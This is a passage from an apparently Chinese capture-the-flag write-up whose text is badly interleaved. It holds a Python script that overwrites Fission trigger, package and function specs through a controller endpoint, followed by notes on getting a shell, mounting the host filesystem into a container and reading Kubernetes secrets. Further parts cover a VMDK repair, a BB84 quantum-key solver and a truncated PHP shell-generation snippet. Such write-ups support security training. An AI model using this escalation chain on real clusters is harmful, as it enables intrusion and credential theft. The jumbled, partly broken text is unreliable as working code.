            "ExecutionStrategy": {
                "ExecutorType": "poolmgr",
                "MinScale": 0,
                "MaxScale": 0,
                "TargetCPUPercent": 0,
                "SpecializationTimeout": 120
            },
            "StrategyType": "execution"
        },
        "functionTimeout": 60,
        "idletimeout": 120,
        "concurrency": 5
    }
}
"""
trigger_data = """
{
    "metadata": {
        "name": "a4a6c777-a0af-4575-a541-be938d8e5055",
        "namespace": "default",
        "selfLink": 
"/apis/fission.io/v1/namespaces/default/httptriggers/a4a6c777-a0af-4575-a541-
be938d8e5055",
        "uid": "05034b5f-5131-4a51-9d2d-3326b02f3d10",
        "resourceVersion": "65860",
        "generation": 1,
        "creationTimestamp": "2021-03-04T05:08:40Z",
        "managedFields": [
            {
                "manager": "fission-bundle",
                "operation": "Update",
                "apiVersion": "fission.io/v1",
                "time": "2021-03-04T05:08:40Z"
            }
        ]
    },
    "spec": {
        "host": "",
        "relativeurl": "/upload123",
        "method": "GET",
        "functionref": {
            "type": "name",
            "name": "options-trigger",
            "functionweights": null
        },
        "createingress": true,
        "ingressconfig": {
            "annotations": null,
            "path": "/upload123",
            "host": "*",
            "tls": ""
        }
    }
}
"""
data = {
    "endpoint":"fission",
    # "key":"de9ccaa1-9f2f-4c5d-ada4-1bdd0dc09fe9.php",
    "bucket":"controller",
    # "file":"MTIzNA=="
}
def changeTrigger():
    dd = dict(data)
    dd['key'] = "v2/triggers/http/a4a6c777-a0af-4575-a541-be938d8e5055"
    dd['file'] = base64.b64encode(trigger_data.encode()).decode()
    # dd = json.loads(trigger_data)
    print(dd)
    # resp = requests.put("
"), json=dd)
    resp = requests.post("
", json=dd)
    print(resp.text)
    time.sleep(2)
def changePackage():
    dd = dict(data)
    dd['key'] = "v2/packages/options-trigger-80f00d41-6f9c-48a4-9bae-
e86939868571"
    dd['file'] = base64.b64encode(package_data.encode()).decode()
    # dd = json.loads(package_data)
    print(dd)
    # resp = requests.put("
"), json=dd)
    resp = requests.post("
", json=dd)
    print(resp.text)
    time.sleep(2)
def changeFunction():
弹回来了之后，因为secret不在docker⾥⾯⽽是在k8s集群的sescrets⾥⾯，所以需要提权
各种提权漏洞⽆果后去研究fission的定义，发现可以⽤spec的⽅式挂在宿主机⽂件
后⾯就是
把集群⾥⾯controller.fission(fisson的控制器的svc)代理到本机 然后新建fission的spec
把宿主机的⽬录挂在到docker⾥⾯
然后拿到集群权限
./fission —server localhost: spec apply
然后等着接shell
然后拿到宿主机⽂件系统的内容，上⾥⾯找k8s凭据，最后读secretsjiu wan shi l
Misc
Virtual Love_Revenge
VMX被加密了
VMDK⽂件头被动过，补⼀下 4B 44 4D 56 01 00 00 00，VMDK Descriptor好像也缺东⻄，也照着抄⼀
下
Descriptor⾥⾯缺parent CID，还有每个卷的⽂件名都不对
    dd = dict(data)
    dd['key'] = "v2/functions/options-trigger"
    dd['file'] = base64.b64encode(function_data.encode()).decode()
    # dd = json.loads(function_data)
    print(dd)
    # resp = requests.put("
"), json=dd)
    resp = requests.post("
", json=dd)
    print(resp.text)
    time.sleep(2)
def trigger():
    resp = requests.get("
")
    print(resp.text)
if __name__ == "__main__":
    changePackage()
    changeFunction()
    changeTrigger()
    while True:
        trigger()
        time.sleep(2)
还有个0a 20 0d 0a也不对
挂载
拿到解压密码
Virtual Love
直接cat grep⼀下就有了
easyQuantum
tcp数据可以 qload
http://qutip.org/docs/latest/guide/guide-saving.html
root@ubuntu:/mnt/test# cd root/
root@ubuntu:/mnt/test/root# ls
431a60f2bb46c9fcf4f25361c6389f68_7777777h1s  anaconda-ks.cfg
root@ubuntu:/mnt/test/root# cat 431a60f2bb46c9fcf4f25361c6389f68_7777777h1s 
f5`FU2)I$F0Oc'qL@pP)S
#!/bin/env python3
# 
from qutip import *
import os
from Crypto.Util.number import long_to_bytes
### dump all tcp data and split into single one
# split to 569 data
qd=[]
for i in range(569):
    if not os.path.exists(f"{i}_.qu"):
        continue
    t = qload(f"{i}_")
    qd.append(t)
### simulated QKD bb84
# qd[0] == qd[1] == 312
# means length of changed secret key is 312 bits
# sended quantum data
quans=[]
# bob response data
bob=[]
# alice confirm data
alice=[]
for i in range(len(qd)):
    if type(qd[i]) == list and type(qd[i][0]) != int:
        if qd[i+1] == '':
            continue
        bob.append(qd[i+1])
        alice.append(qd[i+2])
        quans.append(qd[i])
a00 = quans[0][0] # array([0.+0.j, 1.+0.j])
a01 = quans[2][0] # array([1.+0.j, 0.+0.j])
a10 = quans[0][1] # array([0.70710678+0.j, 0.70710678+0.j])
a11 = quans[0][2] # array([0.70710678-8.65956056e-17j, -0.70710678+8.65956056e-
17j])
## return value guessed
## because there are only 4 situations
def calb(state, basis):
    if basis == 0:
        if (state == a00).all():
            return '1'
        elif (state == a01).all():
            return '0'
        else:
            return None
    else:
        if (state == a10).all():
            return '0'
        elif (state == a11).all():
            return '1'
        else:
            return None
res = ''
# len(alice) == len(bob) == len(quans) == 168
for i in range(168):
    for j in range(4):
        if alice[i][j] == 1:
            tmp = calb(quans[i][j], bob[i][j])
            if tmp is None:
                print(f"{i}:{j} : {quans[i][j]},{bob[i][j]} not found")
                continue
            res += tmp
# assert(len(res) == 312)
# qd[-1] == 
'0x1ff55f399084148d6d3c2f0d249e035f04726537e6449556c2aa5c088d7ada2d61099611b88f
bb'
print(long_to_bytes(int(qd[-1], 16) ^ int(res, 2)))
Signin
签到
shellgen2
先写了⼀个，提示⻓度过⻓，测试了⼀部分后确定给定的字符串只有⼩写字⺟
直接⽤_09排列⼀下，造出来26个变量，可以⼤⼤减少⻓度
⽤"
x = input()
text += " 0:
        text += '.'
    text += dic[x[i]]
text += "?>"
print(text)
# open("./1.php","w").write(text)